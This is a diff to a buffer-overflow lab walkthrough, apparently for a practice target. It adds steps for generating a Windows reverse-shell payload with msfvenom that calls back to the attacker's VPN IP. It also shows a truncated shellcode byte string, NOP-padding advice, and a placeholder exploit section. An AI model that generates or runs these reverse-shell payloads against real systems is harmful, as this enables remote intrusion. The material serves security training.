@@ -301,7 +301,39 @@ except:
 ---
 
 ### Generate Payload
-        
+
+- Run the following `msfvenom` command on Kali, using your Kali `VPN IP` as the `LHOST` and updating the `-b` option with all the badchars you identified (including `\x00`):
+
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -b "\x00" -f c`
+
+- Copy the generated `C code strings` and integrate them into a new modifies python script called `overflow1_step5_generatePayload.py` script payload variable using the following notation:   
+
+```python
+payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
+"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
+"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
+"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
+```
+
+--- 
+
+### Prepend NOPs / Padding
+
+- Since an **encoder was likely used to generate the payload**, you will need some **space in memory for the payload to unpack itself**. 
+
+    - **You can do this by setting the `padding` variable to a string of `16 or more` `"No Operation"` (`\x90`) bytes:
+
+        - `padding = "\x90" * 16`
+
+```python
+payload = (huevos)
+```
+
+---
+
+### Exploit!!! Que chille!
+
+
 
 ---
 
